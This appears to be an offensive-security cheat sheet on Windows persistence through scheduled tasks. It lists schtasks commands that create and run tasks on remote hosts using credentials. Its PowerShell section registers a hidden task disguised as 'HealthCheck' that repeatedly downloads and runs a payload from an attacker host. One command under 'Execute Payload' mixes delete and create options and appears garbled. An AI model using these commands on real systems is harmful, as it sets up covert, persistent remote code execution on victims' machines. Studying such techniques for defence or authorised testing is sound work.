---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - T1053
  - windows
---
# Living off the Land

## 01 - Command Prompt

### 1.1 - Create Task Syntax

```
C:\> schtasks.exe /create /tn "<task_name>" /tr "<commands>" /sc <minute | hourly | daily | weekly | monthly | once | onstart | onlogon | onidle> <[/st HH:MM:SS | /st <MM/DD/YYYY>]> [/sd <MM/DD/YYYY>] [/it] [/ru <DOMAIN>\<username>] [/rp <password>] [/s <target_IP>]

/create => create a schedule task
/sc => type of schedule
/st => start time
/tn => task name
/tr => task run
/it => Make it interactive when the user is using his computer
/s => computer IP
/ru => specify the username: { [DOMAIN\]<username> | system }
/rp => specify the password
```

### 1.2 - Run Task Syntax

```
C:\> schtasks.exe /run /tn "<task_name>" [/ru <DOMAIN>\<username>] [/rp <password>] [/s <target_IP>]
```

### 1.2 - Stop Task Syntax

```
C:\> schtasks.exe /stop /tn "<task_name>" [/ru <DOMAIN>\<username>] [/rp <password>] [/s <target_IP>]
```

### 1.3 - Delete Task Syntax

```
C:\> schtasks.exe /delete /f /tn "<task_name>" [/ru <DOMAIN>\<username>] [/rp <password>] [/s <target_IP>]
```

### 1.4 - Query Task Syntax

```
C:\> schtasks.exe /query /f /tn "<task_name>" [/ru <DOMAIN>\<username>] [/rp <password>] [/s <target_IP>]
```

### 1.5 - Execute Payload

```
C:\> net.exe time

PS C:\> Get-Date

C:\> schtasks.exe /query /tn "<task_name>" /fo List /v /s <IP>

C:\> schtasks.exe /delete /tn "<task_name>" /tr "<commands>" /sc once /st <HH:mm> /s <IP> /ru [DOMAIN]\<username> /rp <password>

C:\> schtasks.exe /create /tn "<task_name>" /tr "<commands>" /sc once /st <HH:mm> /s <IP> /ru system
```

## 02 - PowerShell

TODO: Fill in this info

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle hidden -c `"IEX (New-Object Net.WebClient).DownloadString('http[s]://<attacker_IP>/payload.ps1')`""

$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 3)
$settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "HealthCheck"
```

---
## References

### Backlinks

- [[Windows Post Exploitation Persistence References]]

### LOFLCAB

- [LOFLCAB: net.exe](https://lofl-project.github.io/loflcab/Binaries/net/)

### Persistence Info

- [Persistence Info: Task Scheduler](https://persistence-info.github.io/Data/taskscheduler.html)

### Red Team Notes

- [Red Team Notes: Schtask](https://www.ired.team/offensive-security/persistence/t1053-schtask)

### Pentestlab

- [Pentestlab Blog: Persistence Scheduled Tasks](https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/)

### DMCXBlue

- [DMCXBlue: Scheduled Task](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/persistence/t1053-scheduled-tasks-job/scheduled-task)

- [DMCXBlue: Userland Persistence](https://dmcxblue.gitbook.io/red-team-notes-2-0/persistence/userland-persistence)